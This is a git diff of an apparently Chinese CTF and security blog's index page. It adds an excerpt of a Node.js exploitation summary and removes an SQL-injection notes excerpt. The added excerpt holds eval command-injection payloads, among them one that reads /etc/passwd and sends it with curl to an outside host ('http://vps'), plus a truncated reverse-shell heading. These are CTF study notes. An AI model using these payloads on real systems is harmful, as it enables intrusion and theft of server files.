@@ -368,6 +368,43 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/" >
+            
+                <span>nodejs利用小总结</span>
+        </a>
+        <div class="abstract-content">
+            参考链接：Node.js 常见漏洞学习与总结
+eval导致的命令执行常见payload弹计算器(windows)：
+1/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);
+读取文件(linux)：
+12/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;);;curl -F参数用于传输二进制文件
+反弹shell(linux)：
+12345/ev...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/20</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "nodejs">nodejs</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2021/04/19/redis%E6%94%BB%E9%98%B2%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >
             
                 <span>redis攻防利用面总结</span>
@@ -714,6 +751,8 @@ web服务器：可能需要提权(一般接触到的环境)
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "nodejs">nodejs</a>
+    
         <a class="post-tag" href="javascript:void(0);" data-tags = "2021Nep">2021Nep</a>
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "命令执行">命令执行</a>
@@ -727,44 +766,6 @@ web服务器：可能需要提权(一般接触到的环境)
         <a class="post-tag" href="javascript:void(0);" data-tags = "ThinkPHP">ThinkPHP</a>
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "原型链污染">原型链污染</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "nodejs">nodejs</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/02/28/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E7%AC%94%E8%AE%B0/" >
-            
-                <span>sql注入速查笔记</span>
-        </a>
-        <div class="abstract-content">
-            sql注入分类方式：
-1234提交方式：GET POST COOKIE参数注入：数字型 字符型 搜索型数据库类型：ACCESS&#x2F;Mysql&#x2F;MSSQL&#x2F;ORacle&#x2F;SqlServer手工注入方法：联合查询、报错注入、盲注(基于布尔型、基于时间延迟)
-
-0x01 MysqlMysql划分：权限 root 普通用户 版本 mysql&gt;5.0 mysql&lt;5.0
-1.1 root权限load_file和into outfile用户必须有FILE权限，并且还需要知道网站的绝对路径
-1.1.1 判断是否具有读写权限初步判断当前用户是否对mysq...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/02/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "sql">sql</a>
     
 </div>
             
@@ -2240,9 +2241,28 @@ web服务器：可能需要提权(一般接触到的环境)
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 83
+        Total : 84
         </div>
         <!-- search  -->
         
@@ -2259,6 +2279,11 @@ web服务器：可能需要提权(一般接触到的环境)
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href= "/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/" >nodejs利用小总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2731,9 +2756,9 @@ web服务器：可能需要提权(一般接触到的环境)
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
-    
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
@@ -2755,6 +2780,8 @@ web服务器：可能需要提权(一般接触到的环境)
     
         <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
+        <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
+    
         <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
     
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
@@ -2763,17 +2790,17 @@ web服务器：可能需要提权(一般接触到的环境)
     
         <span class="sidebar-tag-name" data-tags="2019CISCN"><span class="iconfont-archer">&#xe606;</span>2019CISCN</span>
     
+        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
+    
         <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
     
         <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
     
-        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
+        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
     
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
         <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
-    
-        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
     
         <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
     
@@ -2818,8 +2845,6 @@ web服务器：可能需要提权(一般接触到的环境)
         <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
     
         <span class="sidebar-tag-name" data-tags="原型链污染"><span class="iconfont-archer">&#xe606;</span>原型链污染</span>
-    
-        <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
         <span class="sidebar-tag-name" data-tags="HTTP协议"><span class="iconfont-archer">&#xe606;</span>HTTP协议</span>
     
